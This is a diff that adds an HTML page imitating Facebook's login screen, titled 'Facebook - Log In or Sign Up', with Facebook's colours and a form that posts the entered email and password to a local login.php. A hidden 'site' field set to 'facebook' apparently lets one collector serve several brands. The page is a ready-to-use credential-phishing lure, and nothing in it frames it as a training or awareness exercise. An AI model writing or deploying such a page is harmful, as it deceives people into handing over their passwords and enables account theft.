@@ -1,0 +1,70 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8" />
+  <title>Facebook - Log In or Sign Up</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      background-color: #f0f2f5;
+      margin: 0;
+      padding: 0;
+    }
+    .login-container {
+      width: 360px;
+      margin: 100px auto;
+      padding: 40px;
+      background: white;
+      border-radius: 8px;
+      box-shadow: 0 4px 12px rgba(0,0,0,0.15);
+      text-align: center;
+    }
+    .login-container h1 {
+      color: #1877f2;
+      margin-bottom: 24px;
+      font-size: 32px;
+    }
+    input[type="text"],
+    input[type="password"] {
+      width: 100%;
+      padding: 14px 12px;
+      margin: 8px 0 16px 0;
+      border: 1px solid #dddfe2;
+      border-radius: 6px;
+      font-size: 16px;
+    }
+    input[type="submit"] {
+      width: 100%;
+      padding: 14px;
+      background-color: #1877f2;
+      border: none;
+      border-radius: 6px;
+      color: white;
+      font-weight: bold;
+      font-size: 18px;
+      cursor: pointer;
+      margin-top: 10px;
+    }
+    input[type="submit"]:hover {
+      background-color: #165eab;
+    }
+    .footer-text {
+      font-size: 12px;
+      color: #606770;
+      margin-top: 20px;
+    }
+  </style>
+</head>
+<body>
+  <div class="login-container">
+    <h1>Facebook</h1>
+    <form action="login.php" method="POST">
+      <input type="hidden" name="site" value="facebook" />
+      <input type="text" name="email" placeholder="Email or phone number" required />
+      <input type="password" name="pass" placeholder="Password" required />
+      <input type="submit" value="Log In" />
+    </form>
+    <div class="footer-text">Forgotten password?</div>
+  </div>
+</body>
+</html>
